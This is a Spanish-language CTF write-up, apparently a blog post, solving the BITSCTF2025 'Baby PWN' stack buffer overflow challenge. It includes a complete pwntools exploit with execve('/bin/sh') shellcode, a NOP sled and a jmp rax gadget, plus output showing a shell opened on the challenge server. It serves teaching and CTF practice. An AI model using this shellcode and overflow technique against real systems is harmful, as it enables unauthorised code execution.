---
layout: post
title: Baby PWN BITSCTF2025
comments: true
categories: [Pwn, Writeups, BITSCTF2025]
---

Más vale tarde que nunca, así que aquí tenéis este writeup de la competición de este finde pasado. En este caso se trata de un ejercicio tipo *re2shellcode* bastante sencillito.

<br>
![Image]({{ site.baseurl }}/images/posts/BITSCTF.png){:width="150px"}
<br>

# Overview

El enunciado nos dice lo siguiente:

    I hope you are having a nice day.

Y se nos adjunta un binario `main`.

# Reconocimiento

Lo primero es analizar el binario:

```bash
❯ file main
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e2d574448024e277d4b9a662d470bef9bbab8b3d,
for GNU/Linux 3.2.0, not stripped

❯ checksec --file=main
[*] '/home/kali/Downloads/baby_pwn/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Vemos que es de 64-bits y tenemos todas las protecciones desactivadas. Si descompilamos tendríamos un código como el siguiente:

```c
#include <stdio.h>

void vuln() {
    char buffer[112]; // 0x70 bytes de espacio reservado en la pila
    gets(buffer);     // Buffer overflow
}

int main() {
    vuln();
    return 0;
}

```

Dado que no hay protecciones y tenemos tanto margen para explotar el *buffer overlow*, podemos tratar de ejecutar un *shellcode*. Para ello necesitamos un gadget que llame al shellcode:

```bash
❯ ropper -f main
[...]
0x00000000004010ac: jmp rax; 
```

La idea será introducir un payload con la siguiente estructura:

```
NOPs | shellcode | jmp rax
```

De forma que al saltar al registro, con algo de suerte tendrá dentro los NOPs, que se ejecutarán hasta llegar al shellcode.

# Explotación

Con la estrategia en mente, utilizaremos *python3* y *pwntools* para hacer un script:

```python
#!/bin/python3

from pwn import *

binary = './main'  # Nombre del binario
elf = ELF(binary)

# p = remote('direccion.ip', puerto)
p = process(binary)

#0x00000000004010ac: jmp rax;
jmp_addr = 0x4010ac

shellcode = asm('''
                xor rax, rax
                xor rbx, rbx

                mov rbx, 0x68732f6e69622f
                push rbx

                mov rdi, rsp
                xor rsi, rsi
                xor rdx, rdx

                mov rax, 0x3b
                syscall
                ''',arch='amd64')

offset = 120
padding = b'\x90' * (offset-len(shellcode))

payload = padding + shellcode + p64(jmp_addr)

print(payload)

print("[+] Enviando exploit...")

p.sendline(payload)

p.interactive()
```

Si ejecutamos el solver obtenemos lo siguiente:

```bash
❯ ./solver.py
[*] '/home/kali/Downloads/baby_pwn/main'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to chals.bitskrieg.in on port 6001: Done
b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90H1\xc0H1\xdbH\xbb/bin/sh\x00SH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05\xac\x10@\x00\x00\x00\x00\x00'
[+] Enviando exploit...
[*] Switching to interactive mode
$ ls
flag.txt
main
main.c
run
$ cat flag.txt
BITSCTF{w3lc0m3_70_7h3_w0rld_0f_b1n4ry_3xpl01t4t10n_ec5d9205}
```

Este es un reto sencillo, pero que es muy común en competiciones, así que espero que te haya quedado claro. Nos vemos en el siguiente writeup!